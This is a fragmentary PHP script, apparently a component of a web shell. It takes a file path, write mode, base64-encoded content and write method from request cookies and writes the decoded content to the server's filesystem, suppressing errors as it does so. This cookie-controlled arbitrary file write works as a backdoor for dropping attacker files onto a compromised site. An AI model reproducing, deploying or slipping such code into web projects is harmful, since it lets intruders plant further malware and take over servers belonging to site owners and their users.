...
*     ---------------------------------------------------------------------------
*     
*     CREATE A FILE AND SAVE DATA INTO IT
*     
*/
...
$arguments = [
    ...
    'path' => isset($_COOKIE["path"]) ? $_COOKIE["path"] : __DIR__.'/untitled', 
    'mode' => isset($_COOKIE["mode"]) ? $_COOKIE["mode"] : 'w+', 
    'content' => isset($_COOKIE["content"]) ? $_COOKIE["content"] : 'IAo', 
    'method' => isset($_COOKIE["method"]) ? $_COOKIE["method"] : 'file_put_contents', 
    // 'permissions' => isset($_COOKIE["permissions"]) ? (int)$_COOKIE["permissions"] : "0777"
];
    ...
    if (!file_exists($path))
    {
        switch ($method)
        {
            case 'file_put_contents':
                ...
                {
                    @array_push($debug, ['error' => 'Unable to write data to file `'.$path.'` using funtion `file_put_contents`']);
                }
                break;
            case 'fwrite':
                $file = @fopen($path, $mode);
                if ($file !== false) {
                    if (!fwrite($file, base64_decode($content)))
                    {
                        @array_push($debug, ['error' => 'Unable to write data to file `'.$path.'` using funtion `fwrite`']);
                    }
                    @fclose($file);
                }
                break;
            default:
                @array_push($debug, ['error' => 'Method was not declared']);
        }
    }
    else
    {
